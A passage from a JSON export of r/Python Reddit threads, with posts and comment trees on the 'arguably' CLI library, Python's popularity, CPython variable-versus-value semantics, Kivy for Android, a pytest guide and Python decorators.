            "content": "No comparison to fire?",
            "replies": [
                {
                    "author": "AND_MY_HAX",
                    "score": "5",
                    "content": "Sure! fire is great, super flexible. That's where arguably drew inspiration for automatically creating a CLI from a script without any setup. One key difference is that arguably utilizes type hints for the function signature, automatically converting the command line arguments to the correct types. Another is that arguably lets you specify what should be positional arguments, vs what should be options. Arguments to the CLI look just like calling the Python function. Using the function defined in the OP: >>> from intro import some_function >>> some_function(\"asdf\", 0, 7, 8, 9, option=2.71) required='asdf', not_required=0, others=(7, 8, 9), option=2.71 On the command line: user@machine:~$ ./intro.py asdf 0 7 8 9 --option 2.71 required='asdf', not_required=0, others=(7, 8, 9), option=2.71 For easy CLIs where the inputs can all have default values (or you're comfortable with it guessing the type), fire is the better choice. Otherwise, arguably is a good option if you'd like extra features through type hints and want more control over how your CLI behaves.",
                    "replies": [
                        {
                            "author": "hotplasmatits",
                            "score": "2",
                            "content": "If you use type hints, I believe fire does all of that",
                            "replies": [
                                {
                                    "author": "AND_MY_HAX",
                                    "score": "2",
                                    "content": "Hm, I haven't seen it utilize my type hints in the past. Though it does take a guess at the type based off its value: https://github.com/google/python-fire/blob/master/docs/guide.md#argument-parsing"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "stone_surgeon",
            "score": "2",
            "content": "Awesome!"
        },
        {
            "author": "reightb",
            "score": "2",
            "content": "cool lib! reminds me of click"
        },
        {
            "author": "tellurian_pluton",
            "score": "2",
            "content": "i love arguably."
        },
        {
            "author": "taciom",
            "score": "2",
            "content": "Does it play well with gooey?",
            "replies": [
                {
                    "author": "AND_MY_HAX",
                    "score": "3",
                    "content": "I didn't know this was a thing! Just tried it, and it seems to work just fine, which is really cool. I'm tempted to make this a supported feature, would be super cool to auto-generate a GUI from a script using the python3 -m arguably your_script.py syntax."
                }
            ]
        },
        {
            "author": "JamzTyson",
            "score": "1",
            "content": "def some_function(required, not_required=2, *others: int, option: float = 3.14): That syntax looks strange, given that positional arguments cannot be passed after a keyword argument."
        },
        {
            "author": "yrubooingmeimryte",
            "score": "1",
            "content": "I thought this looked familiar: https://www.reddit.com/r/madeinpython/comments/14b2kf2/the_best_python_cli_library_arguably/ Same title and everything."
        },
        {
            "author": "Rawing7",
            "score": "1",
            "content": "This looks really good! I think this is the first CLI tool that extracts the parameter descriptions from the docstring, which is super nice."
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "jtdi2e",
    "post_score": "2269",
    "post_time": "Friday, November 13, 2020 at 11:22:42 AM GMT+3",
    "flair_text": "News",
    "post_title": "Python swallows Java to become second-most popular programming language",
    "media": [
        "https://www.theregister.com/2020/11/12/python_swallows_java_to_become/",
        "https://external-preview.redd.it/JhxHswgcTBIcIQTq9U8wVVyh-OQ0u8eamYwVllNX8HI.jpg?width=640&crop=smart&auto=webp&s=b6b82c6494720903b2e368b7fcda2553f717ff40"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "[deleted]",
            "score": "252",
            "content": "Python \"swallows\" java. I see what you did there ( ͡° ͜ʖ ͡°)",
            "replies": [
                {
                    "author": "TooSexyForName21",
                    "score": "90",
                    "content": "Just a regular snake that drinks regular coffee."
                },
                {
                    "author": "yhgfvtfhbv",
                    "score": "14",
                    "content": "Get because python is a snake",
                    "replies": [
                        {
                            "author": "ChonkyXL",
                            "score": "6",
                            "content": "Yeah and Java is a coffee mug, get it? get it?"
                        }
                    ]
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "585",
            "content": "C is #1 according to this article, if anyone wants the TL;DR. A quote at the end that I found interesting: \"And Python's 'slowness' is overstated. Who cares about some other language that's a few nanoseconds faster if you spend hours (or days or weeks) trying to figure out how to use it? A human's time is more valuable than a computer's.\" I think this quote just about sums up the creator's POV on other languages, specifically Java. I don't think he's really comparing Python to something like C/C++ because those languages will run circles around Python with more than just \"nanosecond\" margins if used properly. Not to mention other languages like C/C++ are mature and are used to build projects that last for decades, even longer. I still see companies struggling to move their technologies from Python2 to Python3 due to it's end of support. I love Python and use it often, but in certain fields people have to care about speed, performance and stability. Sometimes it's a matter of life and death. I wouldn't even trust Java for those types of tasks tbh let alone Python. It's easy to learn and use and it's fast enough to do most tasks that people need, but I still think languages like C/C++ are superior.",
            "replies": [
                {
                    "author": "harylmu",
                    "score": "169",
                    "content": "I think this quote is really not accurate because speed isn't the most important (well, usually), but a good concurrency story can save big dollars. I rewrote one of our Python app in .NET Core 5 and I wasn't able to kill it with load testing (2000 req, 200 concurrency), while the Python 3.8 app with FastAPI (literally) hanged around 25 requests per second. And to be clear: I made sure that all IO operations are async in the Python version (database queries, Consul queries, SNS publish, S3 upload - even though aioboto3 isn't too stable yet). This alone means that we're able to save thousands (millions on long term?) of dollars by running less instances. Other than that, the speed difference between Python and typed languages is really NOT nanoseconds. I don't know what to say, test it yourself."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cwuc7k",
    "post_score": "6",
    "post_time": "Tuesday, May 21, 2024 at 3:00:07 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "toxic_acro",
            "score": "1",
            "content": "I was hoping someone who is familiar with the CPython implementation details could clear something up for me. I recently participated in a thread on r/learnpython that became a bit of a shitshow Someone had asked a question about what happened to an object in memory (in this particular case, a list) after the variable that originally referred to it gets assigned to a different object instead. The original code in question is: my_global_list = [] def my_method(): global my_global_list my_local_list = [] my_local_list.append(1) my_local_list.append(3) my_global_list = my_local_list my_method() print(my_global_list) One commenter (who claimed to have been a core dev for several years) made a few points across several comments and was called an idiot/asshole/obviously lying about having been a core dev, but as far as I can tell, they were correct in all of their statements. The following list contains every point that the (potentially lying) core dev commenter made about how the CPython internals worked (often in reply to comments that have since been deleted, so it was a bit tricky to follow). I don't see (with my limited understanding) which part is wrong and why others jumped down this person's throat Variables and values are different things and it's important to keep that distinction in mind The list object (value) referred to by my_local_list (variable) has a second name by the end of the function, because my_global_list (variable) also now points to the same list object (value). When my_local_list (variable) goes out of scope, the second name (variable) keeps it alive, so the list object (value) will not be destroyed by the GC. The list object (value) that my_global_list (variable) originally referred to no longer has any references at the end of the function, so the GC can now delete it A PyObject is a value not a variable A PyObject can be referenced by many variables. Not just one. The relationship between PyObjects and variables is one-to-many. A PyObject does not know or care about variables except insofar as they are one (of the multiple possible) way that a refcount can be incremented. The GC has nothing to do with managing the memory used by variables. The GC manages the memory used by values which are referenced by variables. Variables, themselves, are in stack frame objects which are not GCed objects. Python variables do not have type information at runtime. This is a defining characteristic of Python. Values have type. my own sidenote here: this is my understanding of what it means that Python is both dynamically typed and strictly typed. The variable doesn't know about types and so can refer to a value of any type, but the value always has exactly one type and the PyObject \"knows\" that type info. Python variables do not have reference counts. Values have reference counts. Is there actually anything wrong with any of these points? This matches my own (again, limited) understanding of how CPython works, but apparently some people think this person is a lying idiot.",
            "replies": [
                {
                    "author": "toxic_acro",
                    "score": "1",
                    "content": "Turns out every single comment disagreeing with this explanation has since been deleted by the people who posted them, so this probably actually is correct",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "You are free to look at my profile and comment history I made a total of 5 comments in that thread (none of which were directly on one of your posts, but 4 of the 5 were buried in a thread that you had previously participated in). I have never directly messaged you or anyone else in that thread, and I don't think anything I have said is harassment (which I could be wrong about and, if so, I am actually very sorry. I love talking about Python and it makes me sad to see people be made fun of). The only thing I have said that could even remotely be considered harassment was quoted a chain of back-and-forth comments you had with someone else (after you deleted every one of your comments, so that the debate was pretty much impossible to follow), after which I said that you were wrong and misunderstood the other person (your primary disagreement seems to be on #1 above) I'll again quote that verbatim (and hope that it isn't viewed as harassment) As I mentioned above, I am literally one of the engineers who added Python's gc monitoring to Visual Studio. The memory that is pointed to the global list doesn't get deleted but there is still quite a large number of features of that variable that does get gc'd as I explained. There is more associated with a variable than just the obvious memory that it holds. Please enumerate the \"large number of features\" of the variable that get deleted to educate us all. Just of the top of my head? Type Information: indicating the object's type (this can have associated dictionaries that store sub-graph relationships (used in the initial gc pass to speed up the graph search)). Reference Count: Initially set to 1, signifying that foo references the object. Cyclic Garbage Collection: the main gc holds onto sub-graphs that are maintained by a LRU list (this is another optimization path) Python variables do not have type information at runtime. This is a defining characteristic of Python. Values have type. Python variables do not have reference counts. Values have reference counts. What would one use the reference count of a variable for? Cyclic garbage collection is once again an operation on values, not variables. Python variables do not have type information at runtime. Lord... you are talking about Python from a user's perspective. From an implementation perspective the runtime absolutely keeps track of all the information I enumerated above. You can literally switch out one gc for a different implementation (I know this because we did it at Microsoft so that our internal profiler was able to track things in the same way that our .NET profiler does). I'm done here. I don't know if you are just a troll or if you have some issues you need to work through. DUDE!!! A PyObject is a VALUE NOT A VARIABLE!!!!! You seem to really know your stuff and yet this one, very basic concept is eluding you. A PyObject can be referenced by many variables. Not just one. The relationship between PyObjects and Variables is 1 to many. A PyObject does not know or care about variables except insofar as they are one (only one) kind of thing that can increment a refcount. You haven't yet listed a single feature of a VARIABLE. I was not involved in this chain at all, but I did quote it later because I thought (and continue to think) that you were ignoring point #1 above Maybe point #1 is wrong? I truly don't know, but I don't think it is I absolutely do want answers. My experience of that thread was: Somebody said this list of things Several people repeatedly said that they were wrong, but I have yet to see anyone say which things they were wrong about (every disagreement seems to just refer to values as variables, and ignore this person keep saying that variables and values are different) As part of saying this person was wrong, other people said this person is an idiot and a liar and an asshole and repeatedly mocked them (which seems pretty mean-spirited) All of the things in the list look correct to me, but if any of them are not correct, that means my understanding of Python is flawed and I would like to correct that flaw",
                            "replies": [
                                {
                                    "author": "toxic_acro",
                                    "score": "1",
                                    "content": "You are free to look at my profile and comment history I made a total of 5 comments in that thread (none of which were directly on one of your posts, but 4 of the 5 were buried in a thread that you had previously participated in). I have never directly messaged you or anyone else in that thread, and I don't think anything I have said is harassment (which I could be wrong about and, if so, I am actually very sorry. I love talking about Python and it makes me sad to see people be made fun of). The only thing I have said that could even remotely be considered harassment was quoted a chain of back-and-forth comments you had with someone else (after you deleted every one of your comments, so that the debate was pretty much impossible to follow), after which I said that you were wrong and misunderstood the other person (your primary disagreement seems to be on #1 above) I'll again quote that verbatim (and hope that it isn't viewed as harassment) As I mentioned above, I am literally one of the engineers who added Python's gc monitoring to Visual Studio. The memory that is pointed to the global list doesn't get deleted but there is still quite a large number of features of that variable that does get gc'd as I explained. There is more associated with a variable than just the obvious memory that it holds. Please enumerate the \"large number of features\" of the variable that get deleted to educate us all. Just of the top of my head? Type Information: indicating the object's type (this can have associated dictionaries that store sub-graph relationships (used in the initial gc pass to speed up the graph search)). Reference Count: Initially set to 1, signifying that foo references the object. Cyclic Garbage Collection: the main gc holds onto sub-graphs that are maintained by a LRU list (this is another optimization path) Python variables do not have type information at runtime. This is a defining characteristic of Python. Values have type. Python variables do not have reference counts. Values have reference counts. What would one use the reference count of a variable for? Cyclic garbage collection is once again an operation on values, not variables. Python variables do not have type information at runtime. Lord... you are talking about Python from a user's perspective. From an implementation perspective the runtime absolutely keeps track of all the information I enumerated above. You can literally switch out one gc for a different implementation (I know this because we did it at Microsoft so that our internal profiler was able to track things in the same way that our .NET profiler does). I'm done here. I don't know if you are just a troll or if you have some issues you need to work through. DUDE!!! A PyObject is a VALUE NOT A VARIABLE!!!!! You seem to really know your stuff and yet this one, very basic concept is eluding you. A PyObject can be referenced by many variables. Not just one. The relationship between PyObjects and Variables is 1 to many. A PyObject does not know or care about variables except insofar as they are one (only one) kind of thing that can increment a refcount. You haven't yet listed a single feature of a VARIABLE. I was not involved in this chain at all, but I did quote it later because I thought (and continue to think) that you were ignoring point #1 above Maybe point #1 is wrong? I truly don't know, but I don't think it is I absolutely do want answers. My experience of that thread was: Somebody said this list of things Several people repeatedly said that they were wrong, but I have yet to see anyone say which things they were wrong about (every disagreement seems to just refer to values as variables, and ignore this person keep saying that variables and values are different) As part of saying this person was wrong, other people said this person is an idiot and a liar and an asshole and repeatedly mocked them (which seems pretty mean-spirited) All of the things in the list look correct to me, but if any of them are not correct, that means my understanding of Python is flawed and I would like to correct that flaw"
                                },
                                {
                                    "author": "toxic_acro",
                                    "score": "0",
                                    "content": "Also, looking at the edit history of this comment on pullpush This line: Ah... I see I wasn't the only person you harrassed. I also deleted everything because you and another person were harassing me. And now you post this crap!? Was originally: I was part of that thread and had to delete everything because you and another person were harassing me. I had to threaten both of you with blocking your accounts. I even reported you to both the mods of this sub and reddit. And now you post this crap!? Again, I never posted anything directly on one of your comments, never messaged you, and it looked like you had stopped participating and deleted all but one of your comments by the time I even added anything to the post. I was not even aware that you were the person with all the deleted comments originally until someone else in there referenced the contents of one of your deleted comments and I went to pullpush to try to get a better idea of what was happening (which I've now done again for this thread after getting a notification about another reply but not seeing anything) My only direct interaction with you has been right here. How does that constitute harassment? You certainly never \"threatened me with blocking my account\""
                                }
                            ]
                        },
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "Nowhere did I claim that I am new to Python nor did I claim that I am an expert in how the internals work, I will gladly be very open about my experience with Python. I have been working with Python almost daily for the past 5 years. I have never worked on the C internals, but I have looked at them before, read about them, and think I have a decent understanding of parts of them. I would always be open to learning more about them. I don't believe that anyone OWEs me an explanation to my question. However, I figured a good place that someone might freely offer an explanation is the daily thread on r/Python that says \"Ask Away: Post your advanced Python questions here. Expert Insights: Get answers from experienced developers.\" The above list matches my own understanding of how CPython works. Given what you've written above (which you simply copied from someone else) it is obvious you need to spend more time going through the CPython source Of course I copied it from someone else. I literally describe the list as comments that someone else made. Going through the CPython source is not some simple task. Literally all the response I would need to help start me on my way is something like \"7 isn't quite right, you can read about it here (some link)\" I think you are leaving out the parts were everyone in that thread had to report you before you would stop harassing them. This was verbatim, your very first response to me (before it got deleted) i just reported you to both the mods here and reddit. i won't be surprised if your comments are coming from the same ip the idiot uses. do not contact me again - this is the 2nd time i'm asking. work through whatever personal problems you are going through... don't take it out on people here. Unlike you, every single comment I have made is still available on that thread. You \"politely\" asked me to not contact you again, and yet here you are on a different subreddit mocking me and still refusing to say something as simple as \"7 and 9\" Another verbatim quote from you a very small portion of the python community understands the internals of the runtime. i'm one of the people who does understand it down to it's C guts. I am not saying that you OWE me an explanation, I am trying my best to kindly ask that you (or anyone else) share some of that understanding while refraining from name calling and mocking",
                            "replies": [
                                {
                                    "author": "toxic_acro",
                                    "score": "0",
                                    "content": "Nowhere did I claim that I am new to Python nor did I claim that I am an expert in how the internals work, I will gladly be very open about my experience with Python. I have been working with Python almost daily for the past 5 years. I have never worked on the C internals, but I have looked at them before, read about them, and think I have a decent understanding of parts of them. I would always be open to learning more about them. I don't believe that anyone OWEs me an explanation to my question. However, I figured a good place that someone might freely offer an explanation is the daily thread on r/Python that says \"Ask Away: Post your advanced Python questions here. Expert Insights: Get answers from experienced developers.\" The above list matches my own understanding of how CPython works. Given what you've written above (which you simply copied from someone else) it is obvious you need to spend more time going through the CPython source Of course I copied it from someone else. I literally describe the list as comments that someone else made. Going through the CPython source is not some simple task. Literally all the response I would need to help start me on my way is something like \"7 isn't quite right, you can read about it here (some link)\" I think you are leaving out the parts were everyone in that thread had to report you before you would stop harassing them. This was verbatim, your very first response to me (before it got deleted) i just reported you to both the mods here and reddit. i won't be surprised if your comments are coming from the same ip the idiot uses. do not contact me again - this is the 2nd time i'm asking. work through whatever personal problems you are going through... don't take it out on people here. Unlike you, every single comment I have made is still available on that thread. You \"politely\" asked me to not contact you again, and yet here you are on a different subreddit mocking me and still refusing to say something as simple as \"7 and 9\" Another verbatim quote from you a very small portion of the python community understands the internals of the runtime. i'm one of the people who does understand it down to it's C guts. I am not saying that you OWE me an explanation, I am trying my best to kindly ask that you (or anyone else) share some of that understanding while refraining from name calling and mocking"
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "Rawing7",
                    "score": "1",
                    "content": "I'm admittedly not very familiar with the CPython source code, but most of these are fairly surface-level topics. Variables and values being two distinct things, for example, is part of how the python language works and isn't even specific to CPython. I've been using this language for more than a decade, and I'm sure that at least 95% of this is correct. Also, I noticed you're involved in some drama. And while I don't have the full picture of what happened in that other thread, I have to say that your comments all seem very reasonable, and the other guys' comments... not so much. Honestly, you might be putting more effort into your responses than they deserve."
                }
            ]
        },
        {
            "author": "DOKim_98",
            "score": "0",
            "content": "What web scraping tool should I use for my project? Trying to extract data from different universities website Automate after extracting the data to update it Pretty new to web scraping in python",
            "replies": [
                {
                    "author": "Few-University8109",
                    "score": "2",
                    "content": "I'm not going to recommend a particular tool or library, but this recent Syntax podcast on web scraping would be a good place to start getting a feel for the issues involved. https://syntax.fm/show/763/web-scraping-reverse-engineering-apis"
                },
                {
                    "author": "Algoartist",
                    "score": "1",
                    "content": "import requests from bs4 import BeautifulSoup url = 'https://google.com' response = requests.get(url) if response.ok: soup = BeautifulSoup(response.content, 'html.parser') print(soup.title.string) else: print(f'Failed to retrieve the webpage. Status code: {response.status_code}')"
                }
            ]
        }
    ]
},
{
    "post_author": "klargstein",
    "post_id": "1cvvy36",
    "post_score": "53",
    "post_time": "Sunday, May 19, 2024 at 10:17:49 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "The possibility to build Android apps with python professionally is here and needs your support.",
    "media": [
        "https://www.kickstarter.com/projects/kivyschool/the-pain-free-python-on-android-essentials-course",
        "https://imgur.com/gallery/DtfwOVi"
    ],
    "post_content": "You guys really need to check this. I believe new comers to python would love to tinker with the android ecosystem from the safety of python :-)\nImgur: https://imgur.com/gallery/DtfwOVi\nhttps://www.kickstarter.com/projects/kivyschool/the-pain-free-python-on-android-essentials-course\nEdit: added imgur link.",
    "comments": [
        {
            "author": "riklaunim",
            "score": "23",
            "content": "Nice that's it's growing. Still it needs stronger commerciall recognition/maturity. When I was using it internally for a POC app it was easy to use but then debugging on actual Android devices was so annoying ;)",
            "replies": [
                {
                    "author": "klargstein",
                    "score": "8",
                    "content": "Things since last updates have gone way better especially for performance, also for debugging you can the check the hot reload function created by kivy school team."
                }
            ]
        },
        {
            "author": "Sumif",
            "score": "11",
            "content": "I’ve built a little tool using Flet. Works great. It’s like Python over Flutter",
            "replies": [
                {
                    "author": "Optimal-Statement-41",
                    "score": "2",
                    "content": "Flet looks nice, but as I understand it only allows you to deploy on android as a PWA, which I read \"Limited access to native device features: Progressive web apps may be unable to access all of the features available on a user's device, including push notifications, a camera, and an accelerometer\""
                }
            ]
        },
        {
            "author": "ryanstephendavis",
            "score": "10",
            "content": "https://beeware.org/ Met the maintainer of this project at Pycon this weekend, it seems to have great potential"
        },
        {
            "author": "DaelonSuzuka",
            "score": "20",
            "content": "kivy No thanks, I'd rather chew on broken glass than use kivy again.",
            "replies": [
                {
                    "author": "Muhznit",
                    "score": "23",
                    "content": "Does your hate for kivy go so far that you'd rather chew broken glass than at least explain your pain points with kivy?"
                },
                {
                    "author": "Abh0rash",
                    "score": "1",
                    "content": "I was planning to use Kivy for a small project, what particularly did you dislike? Changed autocorrect Kirby to Kivy",
                    "replies": [
                        {
                            "author": "WJMazepas",
                            "score": "1",
                            "content": "Oh I do love Kirby. Played so much in my DS"
                        }
                    ]
                },
                {
                    "author": "Mirage2k",
                    "score": "1",
                    "content": "Agreed."
                }
            ]
        },
        {
            "author": "JamzTyson",
            "score": "4",
            "content": "Is \"kivyschool\" a part of the kivy project, or a separate entity? In other words, does sponsoring kivyschool directly benefit kivy software or just the person(s) behind kivyschool?"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "I ve built many professional Android apps with Kivy. Some extremely complex using communicating with BLE device, GPS , geofencing, using camera and reading QRCode. It s a real alternative",
            "replies": [
                {
                    "author": "klargstein",
                    "score": "3",
                    "content": "And it has grown even better recently."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "is it really python or just some code conver to android",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "3",
                    "content": "It s a python interpreter built for android, launched by a small java launcher."
                },
                {
                    "author": "klargstein",
                    "score": "2",
                    "content": "It's really pure python"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "Take a look a r/kivy"
        },
        {
            "author": "Own_Cauliflower8609",
            "score": "1",
            "content": "Is this cross-plattform? If not, it will probably have a hard time because native app development is getting more and more obsolete",
            "replies": [
                {
                    "author": "klargstein",
                    "score": "2",
                    "content": "Yes similar to Flutter you can write apps for android, iOS, windows and Linux."
                }
            ]
        }
    ]
},
{
    "post_author": "YounesWinter",
    "post_id": "1culpl3",
    "post_score": "5",
    "post_time": "Saturday, May 18, 2024 at 4:21:53 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "LinkedIn-Learning-Downloader v1.1",
    "media": [
        "https://github.com/M0r0cc4nGh0st/LinkedIn-Learning-Downloader"
    ],
    "post_content": "With Python i created a tool that enables users to download LinkedIn Learning courses, including the often overlooked but incredibly valuable exercise files. This feature sets our project apart, offering a complete learning experience by providing both the course videos and the materials needed for practical application.\nWhat great about it and beyond other tools in the same genre concerned LinkedIn Learning Downloaders, now you can download the whole courses from a path link. this is was never possible without Python.\n For more detailed information, visit the repo : https://github.com/M0r0cc4nGh0st/LinkedIn-Learning-Downloader",
    "comments": []
},
{
    "post_author": "mittwochmensch",
    "post_id": "bsy603",
    "post_score": "2180",
    "post_time": "Saturday, May 25, 2019 at 10:02:41 PM GMT+3",
    "flair_text": "",
    "post_title": "My gravity simulation almost an entire day of work later! Featuring inelastic collisions",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "itstommygun",
            "score": "303",
            "content": "r/gifsthatendtoosoon"
        },
        {
            "author": "DogsAreAnimals",
            "score": "29",
            "content": "Are you trying to save the Pentasolarans? Edit: counting is hard"
        },
        {
            "author": "AggravatingPeak",
            "score": "98",
            "content": "I quite like this have an upvote"
        },
        {
            "author": "silkydangler",
            "score": "16",
            "content": "Can you link to the repo?"
        },
        {
            "author": "[deleted]",
            "score": "30",
            "content": "How about continuity? I’m a little rusty here but if your momentum is being conserved that doesn’t necessarily imply that your mass is also being conserved. If continuity is conserved here may I suggest showing that where the “dots” increase in size accordingly? Also, have an upvote!"
        },
        {
            "author": "WantDebianThanks",
            "score": "11",
            "content": "While I'm impressed at the output, I also have no way of knowing how accurate this is."
        },
        {
            "author": "[deleted]",
            "score": "10",
            "content": "Are you calculating the interaction particle by particle? If you like an additional challenge, look into the particle-in-cell method. It's usually used to solve problems involving a very large (>10e4) ensemble of particles under the influence of electromagnetic interactions, but it can just as well be used to solve gravitational systems for a large amount of massive bodies. You could, for example, make galaxy simulations."
        },
        {
            "author": "FrezoreR",
            "score": "6",
            "content": "Who'd guess a few dots can be so entertaining :) good job!"
        }
    ]
},
{
    "post_author": "Stanulilic",
    "post_id": "1cwm734",
    "post_score": "16",
    "post_time": "Monday, May 20, 2024 at 9:11:27 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "A Beginner's Guide to Unit Testing with Pytest",
    "media": [
        "https://www.reddit.com/r/python/",
        "https://betterstack.com/community/guides/testing/pytest-guide/"
    ],
    "post_content": "Hey r/python!\nI wrote a guide on how to use Pytest, covering a bunch of important features like designing tests, filtering tests, parameterizing tests, fixtures, and more. Check it out on this link.",
    "comments": [
        {
            "author": "TequilaTech1",
            "score": "0",
            "content": "so, you re-wrote the docs?",
            "replies": [
                {
                    "author": "No_Poem_1136",
                    "score": "1",
                    "content": "You know that tutorials are different kinds of documentation then say, a manual, right? I mean why even have schools if we have books, right?"
                }
            ]
        }
    ]
},
{
    "post_author": "marmaladeontoast",
    "post_id": "714kww",
    "post_score": "2252",
    "post_time": "Tuesday, September 19, 2017 at 8:29:14 PM GMT+3",
    "flair_text": "",
    "post_title": "Every article about python decorators be like...",
    "media": [
        "https://preview.redd.it/etmqp95akvmz.jpg?auto=webp&s=0bed5d0431bc56062e4277d8ee57c1aebd9c8975",
        "https://i.redd.it/etmqp95akvmz.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "coreyschafer",
            "score": "294",
            "content": "I put together a video on decorators that some people have found useful. Some people complained about the rabbit-hole of videos that are referenced in that tutorial, but the best route to learn decorators is to first fully understand first-class functions, then closures, then decorators... so each tutorial stacks on top of the previous.",
            "replies": [
                {
                    "author": "discofudge",
                    "score": "25",
                    "content": "I found your videos last week when I was learning about decorators and they're fantastic! So clear and well-explained. Thank you!"
                },
                {
                    "author": "jorge1209",
                    "score": "58",
                    "content": "Oh so now I get to watch you do a Bob Ross and go from two circles to owl... great!!!",
                    "replies": [
                        {
                            "author": "coreyschafer",
                            "score": "93",
                            "content": "Happy little lines of code"
                        }
                    ]
                },
                {
                    "author": "Culentriel",
                    "score": "8",
                    "content": "Coreyschafer has the best python tuts on yt hands down"
                },
                {
                    "author": "-pooping",
                    "score": "6",
                    "content": "Actually a nice video, thanks!"
                },
                {
                    "author": "[deleted]",
                    "score": "",
                    "content": "What about videos with less passion?",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "15",
                            "content": "What about videos with less passion?"
                        },
                        {
                            "author": "coreyschafer",
                            "score": "6",
                            "content": "Sorry, I don't believe there is a transcript. I believe I have the rough script that I used for that video, but without the context of what's on screen, it wouldn't make much sense. I'd like to start making a blog post to supplement each video, but I currently don't have the time to make that happen."
                        }
                    ]
                },
                {
                    "author": "TheMadHatterz",
                    "score": "3",
                    "content": "Really appreciate your videos!! Found them when I started learning, the class series helped me alot!"
                },
                {
                    "author": "donald_trub",
                    "score": "3",
                    "content": "I discovered your YouTube channel yesterday and it's a fantastic resource. I plan on making my way through all your content! Keep the videos coming!"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "58",
            "content": "https://realpython.com/blog/python/primer-on-python-decorators/"
        },
        {
            "author": "RockingDyno",
            "score": "77",
            "content": "Not trying to come off as smug here. But what issue of decorators are people struggling the most with? I come from a very functional background, so the concept of a function taking other functions as input and returning modified new functions isn't all that foreign or complicated to me, but I've only ever taught matlab where that sort of thing isn't part of pensum, so I'm curios what snags people hit when being taught Python."
        },
        {
            "author": "hylje",
            "score": "26",
            "content": "r/restofthefuckingowl"
        },
        {
            "author": "funkalunatic",
            "score": "19",
            "content": "Took me a while too originally. \"It's just syntactic sugar\" half the tutorials insist, as if that explains anything."
        },
        {
            "author": "Sohcahtoa82",
            "score": "5",
            "content": "Let me try to explain decorators. Let's start with a simple function: def printValue(x): print('value is', x) In Python, functions are first-class. That means they're objects and can be treated as such. In other words, you can do this: printX = printValue printX(123) And it would print \"value is 123\". printValue and printX are both references to a function object. This means you can write a function that returns a function. Remember that Python allows functions to be defined inside other functions. The result is the inner function is only defined within the outer function. Imagine you had a bunch of functions already written and you decided you wanted to add logging to each one to time how long they took. You could add the code to time how long the function runs to each individual function, but that's cumbersome and really difficult if the function has multiple places where it could return. One way to do this would be to create a function that \"wraps\" a function with logging times, then re-assigns the functions. It would look something like this: def timeFunction(func): def inner(*args, **kwargs): begin = time.time() returnValue = func(*args, **kwargs) executiontime = time.time() - begin print('Function call took', executionTime, 'seconds') return returnValue return inner def someFunction(): # .... do a bunch of stuff def someOtherFunction(): # .... do a bunch of other stuff someFunction = timeFunction(someFunction) someOtherFunction = timeFunction(someFunction) If you look closely at the last two lines there, you should be able to understand what's happening. The timeFunction function is called with someFunction as a parameter. An inner() function is defined within timeFunction. The body of that function takes note of the current time, calls the function that was passed to timeFunction, using the parameters passed to inner(), prints the execution time, then returns the value of the function. That local function is returned. someFunction is re-assigned to that inner function that was declared inside timeFunction on step 2. So now when someFunction is executed, it logs the start time, executes the function that someFunction originally referred to, prints the execution time, and returns the value. Now, here's where people start talking about syntactic sugar. Those two lines at the end of that code can be removed, and instead of re-assigning those functions, you just use timeFunction as a decorator: def timeFunction(func): def inner(*args, **kwargs): begin = time.time() returnValue = func(*args, **kwargs) executiontime = time.time() - begin print('Function call took', executionTime, 'seconds') return returnValue return inner @timeFunction def someFunction(): # .... do a bunch of stuff @timeFunction def someOtherFunction(): # .... do a bunch of other stuff The decorator there is syntactic sugar for someFunc = decoratorFunction(someFunc) being done after someFunc is defined. It gets a LITTLE more complex if your decorator function accepts parameters, but the idea is similar. Hopefully this makes sense."
        },
        {
            "author": "viscence",
            "score": "5",
            "content": "@deco def func(): pass All this means is: def func(): pass func = deco(func) Of course, writing a decorator is slightly more complicated since you need to write a function that both takes and returns functions, but it doesn't have to be too complicated. For instance: def actually_I_just_want_print(function_to_decorate): return print That's a decorator that replaces whatever it decorates with the print function (python 3. For 2, substitute your favourite function), so: @actually_I_just_want_print def complicated_function(): pass complicated_function(\"hello\") # prints \"hello\" :D I suspect the owl step is creating a new function inside the decorator, because the syntax is just a bit more loopy, but it's not so bad: def force_uppercase(function_to_decorate): def decorated_function_to_return(): # define a function return function_to_decorate().upper() #use the original function return decorated_function_to_return # return the new function @force_uppercase def whoami(): return \"Bob\" whoami() # returns BOB"
        },
        {
            "author": "tunisia3507",
            "score": "4",
            "content": "Obviously they're just a function which takes arbitrary arguments which wraps a function which takes a function as an argument which takes arbitrary arguments and returns arbitrary values, which returns a modified version of the function, which then has some syntactic sugar so as to wrap other functions more easily. Doy."
        },
        {
            "author": "lamecode",
            "score": "3",
            "content": "I use decorators on occasion, but I don't really know how they work. As someone who programs in only Python, I find them one of the least 'Python-esque' parts of the language - up there with lambda (which I do understand)."
        },
        {
            "author": "Xelopheris",
            "score": "6",
            "content": "import owl import restOfTheFuckingOwl"
        }
    ]
},
{
    "post_author": "vikashgraja",
    "post_id": "1cvhi1m",
    "post_score": "489",
    "post_time": "Sunday, May 19, 2024 at 9:05:25 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "You should only use licensed version of python",
    "media": [],
